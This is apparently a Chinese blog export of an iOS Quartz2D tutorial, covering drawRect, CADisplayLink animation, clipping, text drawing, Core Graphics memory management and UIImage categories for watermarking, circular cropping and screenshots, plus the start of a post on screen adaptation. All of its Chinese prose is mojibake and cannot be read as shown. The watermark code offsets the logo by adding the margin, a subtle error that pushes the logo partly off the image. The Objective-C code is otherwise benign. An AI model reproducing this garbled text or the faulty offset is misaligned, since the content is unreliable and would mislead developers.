ä¸ºåœ¨drawRect:æ–¹æ³•ä¸­æ‰èƒ½å–å¾—è·Ÿviewç›¸å…³è”çš„å›¾å½¢ä¸Šä¸‹æ–‡ drawRect:æ–¹æ³•åœ¨ä»€ä¹ˆæ—¶å€™è¢«è°ƒç”¨ï¼Ÿ å½“viewç¬¬ä¸€æ¬¡æ˜¾ç¤ºåˆ°å±å¹•ä¸Šæ—¶ï¼ˆè¢«åŠ åˆ°UIWindowä¸Šæ˜¾ç¤ºå‡ºæ¥ï¼‰è°ƒç”¨viewçš„setNeedsDisplayæˆ–è€…setNeedsDisplayInRect:æ—¶ æ³¨æ„ç‚¹ Quartz2Dçš„APIæ˜¯çº¯Cè¯­è¨€çš„ Quartz2Dçš„APIæ¥è‡ªäºŽCore Graphicsæ¡†æž¶ æ•°æ®ç±»åž‹å’Œå‡½æ•°åŸºæœ¬éƒ½ä»¥CGä½œä¸ºå‰ç¼€ 1234CGContextRefCGPathRefCGContextStrokePath(ctx);â€¦â€¦ å¸¸ç”¨å±žæ€§æ–¹æ³• drawRect:ä¸­å–å¾—çš„ä¸Šä¸‹æ–‡ åœ¨drawRect:æ–¹æ³•ä¸­å–å¾—ä¸Šä¸‹æ–‡åŽï¼Œå°±å¯ä»¥ç»˜åˆ¶ä¸œè¥¿åˆ°viewä¸Š Viewå†…éƒ¨æœ‰ä¸ªlayerï¼ˆå›¾å±‚ï¼‰å±žæ€§ï¼ŒdrawRect:æ–¹æ³•ä¸­å–å¾—çš„æ˜¯ä¸€ä¸ªLayer GraphicsContextï¼Œå› æ­¤ï¼Œç»˜åˆ¶çš„ä¸œè¥¿å…¶å®žæ˜¯ç»˜åˆ¶åˆ°viewçš„layerä¸ŠåŽ»äº† Viewä¹‹æ‰€ä»¥èƒ½æ˜¾ç¤ºä¸œè¥¿ï¼Œå®Œå…¨æ˜¯å› ä¸ºå®ƒå†…éƒ¨çš„layer è‡ªå®šä¹‰viewçš„æ­¥éª¤ æ–°å»ºä¸€ä¸ªç±»ï¼Œç»§æ‰¿è‡ªUIView å®žçŽ°- (void)drawRect:(CGRect)rectæ–¹æ³•ï¼Œç„¶åŽåœ¨è¿™ä¸ªæ–¹æ³•ä¸­ å–å¾—è·Ÿå½“å‰viewç›¸å…³è”çš„å›¾å½¢ä¸Šä¸‹æ–‡ ç»˜åˆ¶ç›¸åº”çš„å›¾å½¢å†…å®¹ åˆ©ç”¨å›¾å½¢ä¸Šä¸‹æ–‡å°†ç»˜åˆ¶çš„æ‰€æœ‰å†…å®¹æ¸²æŸ“æ˜¾ç¤ºåˆ°viewä¸Šé¢ Quartz2Dç»˜å›¾1234567891011121314// è¿™ä¸ªæ–¹æ³•åªä¼šåœ¨ç¬¬ä¸€æ¬¡åŠ è½½çš„æ—¶å€™è°ƒç”¨ ä¸èƒ½çš„æ‰‹åŠ¨è°ƒç”¨- (void)drawRect:(CGRect)rect&#123; // 1.èŽ·å–ä¸Šä¸‹æ–‡ CGContextRef ctx = UIGraphicsGetCurrentContext(); // 2.ç”»åœ† CGContextAddArc(ctx, 125, 125, self.radius, 0, M_PI * 2, 0); [[UIColor redColor] set]; // è®¾ç½®é¢œè‰² // 3.æ¸²æŸ“ CGContextFillPath(ctx);&#125; é‡ç»˜å®žçŽ°ç®€å•åŠ¨ç”» CADisplayLinkå®šæ—¶å™¨ å¦‚æžœæ¯éš”ä¸€æ®µæ—¶é—´é‡ç»˜,ä¸€èˆ¬ä¸ä¼šä½¿ç”¨NSTimer æ¯æ¬¡å±å¹•åˆ·æ–°çš„æ—¶å€™æ‰ä¼šè§¦å‘,æ¯ç§’å±å¹•åˆ·æ–°60æ¬¡,å³1ç§’è§¦å‘60æ¬¡ æ¯æ¬¡åˆ·æ–°çš„æ—¶å€™å°±é‡ç»˜ä¸€æ¬¡ setNeedsDisplay:é‡ç»˜,ç»™å½“å‰æŽ§ä»¶ç»‘å®šä¸€ä¸ªåˆ·æ–°çš„æ ‡è¯†,æ¯æ¬¡å±å¹•åˆ·æ–°å…¶å®žå°±æ˜¯é‡ç»˜ æ¯æ¬¡å±å¹•è‡ªåŠ¨åˆ·æ–°60æ¬¡,æ¯æ¬¡åˆ·æ–°çš„æ—¶å€™åªä¼šæŠŠå½“å‰éœ€è¦åˆ·æ–°çš„viewé‡ç»˜ 12// é‡ç»˜(ä¼šåˆ é™¤ä¸Šä¸€æ¬¡çš„ç»˜åˆ¶ä¿¡æ¯) [self setNeedsDisplay]; 12345678910111213141516171819202122232425- (void)awakeFromNib&#123;// æ·»åŠ å®šæ—¶å™¨(é€‚åˆæ—¶é—´é—´éš”æ¯”è¾ƒå°å¾—æƒ…å†µ) é‡ç»˜å®žçŽ°åŠ¨ç”»CADisplayLink *link = [CADisplayLink displayLinkWithTarget:self selector:@selector(setNeedsDisplay)];// æ·»åŠ åˆ°ä¸»è¿è¡Œå¾ªçŽ¯,æ‰ä¼šè§¦å‘è¿™ä¸ªå®šæ—¶å™¨[link addToRunLoop:[NSRunLoop mainRunLoop] forMode:NSRunLoopCommonModes];&#125;- (void)drawRect:(CGRect)rect&#123; self.dogY += 7; self.dogY1 += 5; if (self.dogY &gt; rect.size.height) &#123; self.dogY = -128; self.dogY1 = -128; &#125; // ç”»dog UIImage *dog = [UIImage imageNamed:@"dog"]; [dog drawAtPoint:CGPointMake(50, self.dogY)]; // ç”»dog1 UIImage *dog1 = [UIImage imageNamed:@"dog1"]; [dog1 drawAtPoint:CGPointMake(150, self.dogY1)];&#125; å¸¸ç”¨æ‹¼æŽ¥è·¯å¾„çš„å‡½æ•°123456789101112131415// æ–°å»ºä¸€ä¸ªèµ·ç‚¹void CGContextMoveToPoint(CGContextRef c, CGFloat x, CGFloat y)// æ·»åŠ æ–°çš„çº¿æ®µåˆ°æŸä¸ªç‚¹void CGContextAddLineToPoint(CGContextRef c, CGFloat x, CGFloat y)// æ·»åŠ ä¸€ä¸ªçŸ©å½¢void CGContextAddRect(CGContextRef c, CGRect rect)// æ·»åŠ ä¸€ä¸ªæ¤­åœ†void CGContextAddEllipseInRect(CGContextRef context, CGRect rect)// æ·»åŠ ä¸€ä¸ªåœ†å¼§void CGContextAddArc(CGContextRef c, CGFloat x, CGFloat y, CGFloat radius, CGFloat startAngle, CGFloat endAngle, int clockwise) å¸¸ç”¨ç»˜åˆ¶è·¯å¾„çš„å‡½æ•°12345678910// Modeå‚æ•°å†³å®šç»˜åˆ¶çš„æ¨¡å¼void CGContextDrawPath(CGContextRef c, CGPathDrawingMode mode)// ç»˜åˆ¶ç©ºå¿ƒè·¯å¾„void CGContextStrokePath(CGContextRef c)// ç»˜åˆ¶å®žå¿ƒè·¯å¾„void CGContextFillPath(CGContextRef c)æç¤ºï¼šä¸€èˆ¬ä»¥CGContextDrawã€CGContextStrokeã€CGContextFillå¼€å¤´çš„å‡½æ•°ï¼Œéƒ½æ˜¯ç”¨æ¥ç»˜åˆ¶è·¯å¾„çš„ å›¾å½¢ä¸Šä¸‹æ–‡æ ˆçš„æ“ä½œ12345// å°†å½“å‰çš„ä¸Šä¸‹æ–‡copyä¸€ä»½,ä¿å­˜åˆ°æ ˆé¡¶(é‚£ä¸ªæ ˆå«åšâ€å›¾å½¢ä¸Šä¸‹æ–‡æ ˆâ€)void CGContextSaveGState(CGContextRef c)// å°†æ ˆé¡¶çš„ä¸Šä¸‹æ–‡å‡ºæ ˆ,æ›¿æ¢æŽ‰å½“å‰çš„ä¸Šä¸‹æ–‡void CGContextRestoreGState(CGContextRef c) çŸ©é˜µæ“ä½œ12345678910// åˆ©ç”¨çŸ©é˜µæ“ä½œï¼Œèƒ½è®©ç»˜åˆ¶åˆ°ä¸Šä¸‹æ–‡ä¸­çš„æ‰€æœ‰è·¯å¾„ä¸€èµ·å‘ç”Ÿå˜åŒ–// ç¼©æ”¾void CGContextScaleCTM(CGContextRef c, CGFloat sx, CGFloat sy)// æ—‹è½¬void CGContextRotateCTM(CGContextRef c, CGFloat angle)// å¹³ç§»void CGContextTranslateCTM(CGContextRef c, CGFloat tx, CGFloat ty) å›¾ç‰‡æ°´å° æœ‰æ—¶å€™ï¼Œåœ¨æ‰‹æœºå®¢æˆ·ç«¯appä¸­ä¹Ÿéœ€è¦ç”¨åˆ°æ°´å°æŠ€æœ¯ æ¯”å¦‚ï¼Œç”¨æˆ·æ‹å®Œç…§ç‰‡åŽï¼Œå¯ä»¥åœ¨ç…§ç‰‡ä¸Šæ‰“ä¸ªæ°´å°ï¼Œæ ‡è¯†è¿™ä¸ªå›¾ç‰‡æ˜¯å±žäºŽå“ªä¸ªç”¨æˆ·çš„ å®žçŽ°æ–¹å¼ï¼šåˆ©ç”¨Quartz2Dï¼Œå°†æ°´å°ï¼ˆæ–‡å­—ã€LOGOï¼‰ç”»åˆ°å›¾ç‰‡çš„å³ä¸‹è§’ æ ¸å¿ƒä»£ç  12345678å¼€å¯ä¸€ä¸ªåŸºäºŽä½å›¾çš„å›¾å½¢ä¸Šä¸‹æ–‡void UIGraphicsBeginImageContextWithOptions(CGSize size, BOOL opaque, CGFloat scale)ä»Žä¸Šä¸‹æ–‡ä¸­å–å¾—å›¾ç‰‡ï¼ˆUIImageï¼‰UIImage* UIGraphicsGetImageFromCurrentImageContext();ç»“æŸåŸºäºŽä½å›¾çš„å›¾å½¢ä¸Šä¸‹æ–‡void UIGraphicsEndImageContext(); å›¾ç‰‡è£å‰ª æœ‰æ—¶å€™éœ€è¦æŠŠä¸€å¼ æ™®é€šçš„å›¾ç‰‡åˆ»æ„è£å‰ªæˆåœ†å½¢ 123// æ ¸å¿ƒä»£ç void CGContextClip(CGContextRef c)// å°†å½“å‰ä¸Šä¸‹æ‰€ç»˜åˆ¶çš„è·¯å¾„è£å‰ªå‡ºæ¥ï¼ˆè¶…å‡ºè¿™ä¸ªè£å‰ªåŒºåŸŸçš„éƒ½ä¸èƒ½æ˜¾ç¤ºï¼‰ å±å¹•æˆªå›¾ æœ‰æ—¶å€™éœ€è¦æˆªå–å±å¹•ä¸Šçš„æŸä¸€å—å†…å®¹ï¼š 123 // æ ¸å¿ƒä»£ç - (void)renderInContext:(CGContextRef)ctx;è°ƒç”¨æŸä¸ªviewçš„layerçš„renderInContext:æ–¹æ³•å³å¯ è´å¡žå°”æ›²çº¿åº”ç”¨ çŸ©å½¢ 123UIBezierPath *path = [UIBezierPath bezierPathWithRoundedRect:CGRectMake(10, 10, 200, 200) cornerRadius:100];[path stroke]; æ¤­åœ† 123UIBezierPath *path = [UIBezierPath bezierPathWithOvalInRect:CGRectMake(10, 10, 200, 200)];[path stroke]; åœ†å¼§ 12345678910// center:åœ†å¿ƒ// radius:åŠå¾„// startAngle:èµ·å§‹è§’åº¦// endAngle:ç»“æŸè§’åº¦// clockwise: YES:é¡ºæ—¶é’ˆ NO:é€†æ—¶é’ˆCGPoint center = CGPointMake(rect.size.width * 0.5, rect.size.height * 0.5);CGFloat radius = rect.size.width * 0.5 * 0.5;UIBezierPath *path = [UIBezierPath bezierPathWithArcCenter:center radius:radius startAngle:0 endAngle:M_PI clockwise:YES];[path stroke]; æ³¨æ„ç‚¹ç»˜åˆ¶å›¾ç‰‡çš„æ³¨æ„ç‚¹123456789101112131415161718192021// ç»˜åˆ¶å›¾ç‰‡UIImage *image = [UIImage imageNamed:@"é˜¿ç‹¸å¤´åƒ"];// drawAtPoint:é»˜è®¤ç»˜åˆ¶çš„å›¾ç‰‡è·Ÿå›¾ç‰‡æœ¬èº«ä¸€æ ·[image drawAtPoint:CGPointZero];// drawInRect:é»˜è®¤ç»˜åˆ¶çš„å›¾ç‰‡è·ŸæŽ§ä»¶ä¸€æ ·,æ‹‰ä¼¸è·ŸæŽ§ä»¶ä¸€æ ·å¤§[image drawInRect:rect];// è®¾ç½®è£å‰ªåŒºåŸŸçš„ä»£ç å¿…é¡»è¦åœ¨ç»˜åˆ¶ä¹‹å‰// è®¾ç½®è£å‰ªåŒºåŸŸ,è¶…å‡ºè£å‰ªåŒºåŸŸçš„éƒ¨åˆ†ä¼šè¢«è£å‰ªæŽ‰UIRectClip(CGRectMake(0, 0, 50, 50));// Pattern:å¹³é“º[image drawAsPatternInRect:rect];// å¿«é€Ÿçš„å¡«å……ä¸€ä¸ªçŸ©å½¢UIRectFill(CGRectMake(0, 0, 50, 50)); // è¶…å‡ºæŽ§ä»¶çš„éƒ¨åˆ†ä¼šè¢«è£å‰ªæŽ‰ // ç»˜å›¾çš„æ—¶å€™,ç»˜åˆ¶çš„å†…å®¹ä¸èƒ½è¶…è¿‡å½“å‰æŽ§ä»¶ ç»˜åˆ¶æ–‡å­—çš„æ³¨æ„ç‚¹123456789101112131415161718192021222324252627282930// æ–‡å­—NSString *str = @"hello world hello world hello world";// Attributes:å¯ä»¥ç»™æ–‡å­—æ·»åŠ å±žæ€§,å¯Œæ–‡æœ¬,å­—ä½“,é¢œè‰²,ç©ºå¿ƒ,é˜´å½±...// ç”¨ä¸€ä¸ªå­—å…¸åŽ»æè¿°æ–‡æœ¬å±žæ€§NSMutableDictionary *strAttr = [NSMutableDictionary dictionary];// è®¾ç½®å­—å…¸,å­—å…¸å†…å®¹ æ˜¯ ä¸€ä¸ªkeyå¯¹åº”ä¸€ä¸ªvalue// å­—ä½“strAttr[NSFontAttributeName] = [UIFont systemFontOfSize:50];// é¢œè‰²strAttr[NSForegroundColorAttributeName] = [UIColor redColor];// æè¾¹strAttr[NSStrokeWidthAttributeName] = @1;strAttr[NSStrokeColorAttributeName] = [UIColor greenColor];// é˜´å½±NSShadow *shadow = [[NSShadow alloc] init];shadow.shadowOffset = CGSizeMake(10, 10);shadow.shadowColor = [UIColor yellowColor];shadow.shadowBlurRadius = 5;strAttr[NSShadowAttributeName] = shadow;// drawAtPointä¸ä¼šè‡ªåŠ¨æ¢è¡Œ// [str drawAtPoint:CGPointZero withAttributes:strAttr];// drawInRectå¯ä»¥è‡ªåŠ¨æ¢è¡Œ[str drawInRect:self.bounds withAttributes:strAttr]; å†…å­˜ç®¡ç† ä½¿ç”¨å«æœ‰â€œCreateâ€æˆ–â€œCopyâ€çš„å‡½æ•°åˆ›å»ºçš„å¯¹è±¡ï¼Œä½¿ç”¨å®ŒåŽå¿…é¡»é‡Šæ”¾ï¼Œå¦åˆ™å°†å¯¼è‡´å†…å­˜æ³„éœ² ä½¿ç”¨ä¸å«æœ‰â€œCreateâ€æˆ–â€œCopyâ€çš„å‡½æ•°èŽ·å–çš„å¯¹è±¡ï¼Œåˆ™ä¸éœ€è¦é‡Šæ”¾ å¦‚æžœretainäº†ä¸€ä¸ªå¯¹è±¡ï¼Œä¸å†ä½¿ç”¨æ—¶ï¼Œéœ€è¦å°†å…¶releaseæŽ‰ å¯ä»¥ä½¿ç”¨Quartz 2Dçš„å‡½æ•°æ¥æŒ‡å®šretainå’Œreleaseä¸€ä¸ªå¯¹è±¡ã€‚ä¾‹å¦‚ï¼Œå¦‚æžœåˆ›å»ºäº†ä¸€ä¸ªCGColorSpaceå¯¹è±¡ï¼Œåˆ™ä½¿ç”¨å‡½æ•°CGColorSpaceRetainå’ŒCGColorSpaceReleaseæ¥retainå’Œ`releaseå¯¹è±¡ã€‚ ä¹Ÿå¯ä»¥ä½¿ç”¨Core Foundationçš„CFRetainå’ŒCFRelease`ã€‚æ³¨æ„ä¸èƒ½ä¼ é€’NULLå€¼ç»™è¿™äº›å‡½æ•° 123456789101112131415161718192021222324252627282930313233343536// Create\copy\retain ---&gt; release (å‡ºçŽ°è¿™äº›å…³é”®å­—å°±éœ€è¦æ‰‹åŠ¨ç®¡ç†å†…å­˜)- (void)drawRect:(CGRect)rect&#123; // (è°ƒç”¨ocçš„æ–¹æ³•çš„æ—¶å€™ä¸éœ€è¦èŽ·å–ä¸Šä¸‹æ–‡) CGContextRef ctx = UIGraphicsGetCurrentContext(); // 1.å…ˆåˆ›å»ºä¸€ä¸ªè·¯å¾„ CGMutablePathRef linePath = CGPathCreateMutable(); // 2.æ‹¼æŽ¥è·¯å¾„ CGPathMoveToPoint(linePath, NULL, 0, 0); CGPathAddLineToPoint(linePath, NULL, 100, 100); // 3.æ·»åŠ è·¯å¾„åˆ°ä¸Šä¸‹æ–‡ CGContextAddPath(ctx, linePath); CGMutablePathRef circlePath = CGPathCreateMutable(); CGPathAddArc(circlePath, NULL, 150, 150, 50, 0, M_PI * 2, 0); CGContextAddPath(ctx, circlePath); // 4.æ¸²æŸ“ CGContextStrokePath(ctx); // è·¯å¾„çš„å†…å­˜ç®¡ç† CGPathRelease(linePath); CGPathRelease(circlePath); // é¢œè‰²ç©ºé—´çš„å†…å­˜ç®¡è·¯ CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB(); CGColorSpaceRelease(cs); // ä¹Ÿå¯ä»¥ç»Ÿä¸€ä½¿ç”¨è¿™ä¸ªç®¡ç†å†…å­˜// CFRelease(linePath);// CFRelease(circlePath);// CFRelease(cs);&#125; ç»™UIImageæ·»åŠ åˆ†ç±»æ·»åŠ æ°´å°åˆ†ç±»çš„.hæ–‡ä»¶12345#import &lt;UIKit/UIKit.h&gt;@interface UIImage (XSWaterMark)+ (instancetype)waterMarkImgaeWithBg:(NSString *)bg water:(NSString *)logo;@end åˆ†ç±»çš„.mæ–‡ä»¶1234567891011121314151617181920212223242526272829303132333435363738#import "UIImage+XSWaterMark.h"@implementation UIImage (XSWaterMark)+ (instancetype)waterMarkImgaeWithBg:(NSString *)bg water:(NSString *)logo&#123; // 1.åˆ›å»ºèƒŒæ™¯å›¾ç‰‡ UIImage *bgImage = [UIImage imageNamed:bg]; // 2.å¼€å¯(åˆ›å»º)åŸºäºŽä½å›¾çš„ä¸Šä¸‹æ–‡ // ä¸Šä¸‹æ–‡ : åŸºäºŽä½å›¾(bitmap) , æ‰€æœ‰çš„ä¸œè¥¿éœ€è¦ç»˜åˆ¶åˆ°ä¸€å¼ æ–°çš„å›¾ç‰‡ä¸ŠåŽ» // size : æ–°å›¾ç‰‡çš„å°ºå¯¸ // BOOL opaque : Yes æ˜¯ä¸é€æ˜Ž NOè¡¨ç¤ºé€æ˜Ž(ä¸€èˆ¬éƒ½ç”¨ä¸é€æ˜Ž) scale:ä¸€èˆ¬ä¸ç”¨ç¼©æ”¾ 0.0 // è¿™è¡Œä»£ç è¿‡åŽ.å°±ç›¸å½“äºŽå¸¸è§ä¸€å¼ æ–°çš„bitmap,ä¹Ÿå°±æ˜¯æ–°çš„UIImageå¯¹è±¡ UIGraphicsBeginImageContextWithOptions(bgImage.size, NO, 0.0); // 3.ç”»å‡ºèƒŒæ™¯å›¾ç‰‡åˆ°ä¸Šä¸‹æ–‡ä¸­ [bgImage drawInRect:CGRectMake(0, 0, bgImage.size.width, bgImage.size.height)]; // 4.åˆ›å»ºlogoå›¾ç‰‡ ç”»logoå›¾ç‰‡åˆ°ä¸Šä¸‹æ–‡ä¸­åŽ» UIImage *logoImage = [UIImage imageNamed:logo]; CGFloat margin = 5; // logoå’Œè¾¹æ¡†çš„é—´éš™ CGFloat scale = 0.5; CGFloat logoW = logoImage.size.width * scale; CGFloat logoH = logoImage.size.height * scale; CGFloat logoX = bgImage.size.width - logoW + margin; CGFloat logoY = bgImage.size.height - logoH - margin; [logoImage drawInRect:CGRectMake(logoX, logoY, logoW, logoH)]; // 5.èŽ·å–ä¸Šä¸‹æ–‡ä¸­ç”Ÿæˆçš„æ–°çš„å›¾ç‰‡ UIImage *waterImage = UIGraphicsGetImageFromCurrentImageContext(); // 6.ç»“æŸä¸Šä¸‹æ–‡ UIGraphicsEndImageContext(); return waterImage;&#125;@end ä½¿ç”¨1234567891011121314151617181920212223242526272829303132#import "ViewController.h"#import "UIImage+XSWaterMark.h"@interface ViewController ()@property (weak, nonatomic) IBOutlet UIImageView *iconView;@end@implementation ViewController- (void)viewDidLoad &#123; [super viewDidLoad]; // 1.è¿”å›žæ°´å°å›¾ç‰‡ UIImage *waterImage = [UIImage waterMarkImgaeWithBg:@"bg" water:@"logo"]; // 2.æ˜¾ç¤ºå›¾ç‰‡åˆ°viewä¸­ self.iconView.image = waterImage; // 3.å°†å›¾ç‰‡åŽ‹ç¼©ä¸ºäºŒè¿›åˆ¶çš„æ•°æ®ä¿¡æ¯ NSData *data = UIImagePNGRepresentation(waterImage); // 4.å†™å…¥æ•°æ®åˆ°æ²™ç›’documentæ–‡ä»¶å¤¹ä¸­ // 4.1.èŽ·å–å†™å…¥çš„æ²™ç›’æ–‡æ¡£è·¯å¾„ NSString *path = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject] stringByAppendingPathComponent:@"new.png"]; // 4.2.å†™å…¥æ•°æ® [data writeToFile:path atomically:YES]; // æ‰“å°æ²™ç›’çš„ä½ç½® // NSLog(@"%@",NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES));&#125; åœ†å½¢åˆ‡å›¾åˆ†ç±»çš„.hæ–‡ä»¶123456#import &lt;UIKit/UIKit.h&gt;@interface UIImage (XSImageClipToCircle)+ (instancetype)clipImageWithName:(NSString *)name BorderWidth:(CGFloat)borderWidth borderColor:(UIColor *)color;@end åˆ†ç±»çš„.mæ–‡ä»¶1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#import "UIImage+XSImageClipToCircle.h"@implementation UIImage (XSImageClipToCircle)+ (instancetype)clipImageWithName:(NSString *)name BorderWidth:(CGFloat)borderWidth borderColor:(UIColor *)color&#123; // åŠ è½½åŽŸå›¾ UIImage *oldImage = [UIImage imageNamed:name]; // 1.å¼€å¯ä¸Šä¸‹æ–‡// CGFloat border = 3; // å›¾ç‰‡è·ç¦»è¾¹æ¡†çš„è¾¹è· CGFloat imageW = oldImage.size.width + 2 * borderWidth; CGFloat imageH = oldImage.size.height + 2 * borderWidth; UIGraphicsBeginImageContextWithOptions(CGSizeMake(imageW, imageH), NO, 0.0); // 2.å–å¾—ä¸Šä¸‹æ–‡ CGContextRef ctx = UIGraphicsGetCurrentContext(); // 3.ç”»æœ€å¤–é¢çš„æ¡†çš„åœ† [color set]; // åœ†çŽ¯é¢œè‰²ä¸ºç™½è‰² CGFloat bigCircleRadius = imageW * 0.5; CGFloat bigCircleX = bigCircleRadius; CGFloat bigCircleY = bigCircleRadius; CGContextAddArc(ctx, bigCircleX, bigCircleY, bigCircleRadius, 0, M_PI * 2, 0); CGContextFillPath(ctx); // ç”»å‡ºæœ€å¤–é¢çš„å¤§åœ† // 4.æœ€é‡Œé¢çš„å°åœ†(å’Œå¤§åœ†æ˜¯åŒå¿ƒåœ†) CGFloat smallCircleRadius = bigCircleRadius - borderWidth; CGFloat smallCircleX = bigCircleX; CGFloat smallCircleY = bigCircleY; CGContextAddArc(ctx, smallCircleX, smallCircleY, smallCircleRadius, 0, M_PI * 2, 0); // 4.1.è£å‰ª CGContextClip(ctx); // 5.ç”»å›¾ç‰‡åˆ°å°åœ†é‡Œ CGFloat clipImageX = borderWidth; CGFloat clipImageY = borderWidth; CGFloat clipImageW = oldImage.size.width; CGFloat clipImageH = oldImage.size.height; [oldImage drawInRect:CGRectMake(clipImageX, clipImageY, clipImageW, clipImageH)]; // 6.å–å¾—æ–°çš„å›¾ç‰‡ UIImage *clipImage = UIGraphicsGetImageFromCurrentImageContext(); // 7.ç»“æŸä¸Šä¸‹æ–‡ UIGraphicsEndImageContext(); return clipImage;&#125;@end ä½¿ç”¨12345678910111213141516171819202122232425262728#import "ViewController.h"#import "UIImage+XSImageClipToCircle.h" @interface ViewController () @property (weak, nonatomic) IBOutlet UIImageView *iconView; @end @implementation ViewController - (void)viewDidLoad &#123; [super viewDidLoad]; // 1.è¿”å›žè£å‰ªçš„å›¾ç‰‡ UIImage *clipImage = [UIImage clipImageWithName:@"me" BorderWidth:2 borderColor:[UIColor whiteColor]]; // 2.æ˜¾ç¤ºå›¾ç‰‡ self.iconView.image = clipImage; // 3.æ–°å›¾ç‰‡åŽ‹ç¼©ä¸ºäºŒè¿›åˆ¶æ•°æ® NSData *data = UIImagePNGRepresentation(clipImage); // 4.å†™å…¥æ•°æ®åˆ°documentæ–‡ä»¶å¤¹ä¸­ NSString *path = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject] stringByAppendingPathComponent:@"clip.png"]; [data writeToFile:path atomically:YES];&#125; æˆªå±åˆ†ç±»çš„.hæ–‡ä»¶1234567#import &lt;UIKit/UIKit.h&gt;@interface UIImage (XSCaptureScreen)+ (instancetype)captureWithView:(UIView *)view;@end åˆ†ç±»çš„.mæ–‡ä»¶123456789101112131415161718192021222324#import "UIImage+XSCaptureScreen.h"@implementation UIImage (XSCaptureScreen)+ (instancetype)captureWithView:(UIView *)view&#123; // 1.å¼€å¯ä¸Šä¸‹æ–‡(å’ŒæŽ§åˆ¶å™¨viewä¸€æ ·å°ºå¯¸) UIGraphicsBeginImageContextWithOptions(view.bounds.size, NO, 0.0); // 2.èŽ·å–ä¸Šä¸‹æ–‡ CGContextRef ctx = UIGraphicsGetCurrentContext(); // 3.å°†æŽ§åˆ¶å™¨viewæ¸²æŸ“åˆ°ä¸Šä¸‹æ–‡ä¸­ [view.layer renderInContext:ctx]; // 4.èŽ·å–æ–°çš„å›¾ç‰‡ UIImage *captureImage = UIGraphicsGetImageFromCurrentImageContext(); // 5.ç»“æŸä¸Šä¸‹æ–‡ UIGraphicsEndImageContext(); return captureImage;&#125;@end ä½¿ç”¨1234567891011121314151617181920212223242526272829303132333435#import "ViewController.h"#import "UIImage+XSCaptureScreen.h"@interface ViewController ()@property (weak, nonatomic) IBOutlet UIView *cyanView;- (IBAction)CaptureBtnClick;@end@implementation ViewController- (void)viewDidLoad &#123; [super viewDidLoad]; &#125;/** * ç‚¹å‡»æˆªå±è°ƒç”¨çš„æ–¹æ³• */- (IBAction)CaptureBtnClick &#123; dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^&#123; // 1.æˆªå›¾ UIImage *captureImage = [UIImage captureWithView:self.cyanView]; // 2.å†™å…¥æ•°æ® NSData *data = UIImagePNGRepresentation(captureImage); NSString *path = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject] stringByAppendingPathComponent:@"captureImage.png"]; [data writeToFile:path atomically:YES]; &#125;);&#125;@end]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Quartz2D</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSå¼€å‘ä¹‹äº†è§£å±å¹•é€‚é…]]></title>
    <url>%2Farchives%2F31ba9d29.html</url>
    <content type="text"><![CDATA[è·å¶ç”Ÿæ—¶æ˜¥æ¨ç”Ÿï¼Œè·å¶æž¯æ—¶ç§‹æ¨æˆã€‚æ·±çŸ¥èº«åœ¨æƒ…é•¿åœ¨ï¼Œæ€…æœ›æ±Ÿå¤´æ±Ÿæ°´å£°ã€‚ æŽå•†éš ã€Šæš®ç§‹ç‹¬æ¸¸æ›²æ±Ÿã€‹ å±å¹•é€‚é…å±å¹•ç±»åž‹ ç‚¹å’Œåƒç´  å±å¹•åˆ†è¾¨çŽ‡ iPhone4ä¹‹å‰ æ²¡æœ‰é€‚é…ï¼Œä¸ç”¨é€‚é… ç»å¸¸ä¼šå‡ºçŽ°åæ ‡å€¼å†™æ­»çš„ä»£ç  123456789//#define ScreenW 320//#define ScreenH 480#define ScreenW [UIScreen mainScreen].bounds.size.width#define ScreenH [UIScreen mainScreen].bounds.size.height// åˆ›å»ºä¸€ä¸ªæ˜¾ç¤ºåœ¨å±å¹•å³ä¸‹è§’çš„æŒ‰é’®CGFloat buttonW = 100;CGFloat buttonH = 50;button.frame = CGRectMake(ScreenW - buttonW, ScreenH - buttonH, buttonW, buttonH); iPadå‡ºçŽ°ä»¥åŽ éœ€è¦æ¨ªç«–å±é€‚é… å‡ºçŽ°äº†ä¸€ç§æ–¹ä¾¿çš„å±å¹•é€‚é…æŠ€æœ¯ï¼šAutoresizing å±€é™æ€§ï¼šä»…ä»…èƒ½è§£å†³å­æŽ§ä»¶å’Œçˆ¶æŽ§ä»¶ä¹‹é—´çš„ç›¸å¯¹å…³ç³»é—®é¢˜ iOS6å¼€å§‹ï¼ˆXcode4å¼€å§‹ï¼‰ å‡ºçŽ°äº†ä¸€ç§æ–°çš„å±å¹•é€‚é…æŠ€æœ¯ï¼šAutolayout è§£å†³ä»»ä½•æŽ§ä»¶ä¹‹é—´çš„ç›¸å¯¹å…³ç³»é—®é¢˜ iOS8å¼€å§‹ï¼ˆXcode6å¼€å§‹ï¼‰ å‡ºçŽ°äº†ä¸€ç§æ–°çš„å±å¹•é€‚é…æŠ€æœ¯ï¼šSizeclass Autoresizing UIViewAutoresizingFlexibleLeftMargin = 1 &lt;&lt; 0, è·ç¦»çˆ¶æŽ§ä»¶å·¦è¾¹çš„é—´è·æ˜¯ä¼¸ç¼©çš„ UIViewAutoresizingFlexibleRightMargin = 1 &lt;&lt; 2, è·ç¦»çˆ¶æŽ§ä»¶å³è¾¹çš„é—´è·æ˜¯ä¼¸ç¼©çš„ UIViewAutoresizingFlexibleTopMargin = 1 &lt;&lt; 3, è·ç¦»çˆ¶æŽ§ä»¶ä¸Šè¾¹çš„é—´è·æ˜¯ä¼¸ç¼©çš„ UIViewAutoresizingFlexibleBottomMargin = 1 &lt;&lt; 5 è·ç¦»çˆ¶æŽ§ä»¶ä¸‹è¾¹çš„é—´è·æ˜¯ä¼¸ç¼©çš„ UIViewAutoresizingFlexibleWidth = 1 &lt;&lt; 1, å®½åº¦è·Ÿéšçˆ¶æŽ§ä»¶å®½åº¦è¿›è¡Œä¼¸ç¼© UIViewAutoresizingFlexibleHeight = 1 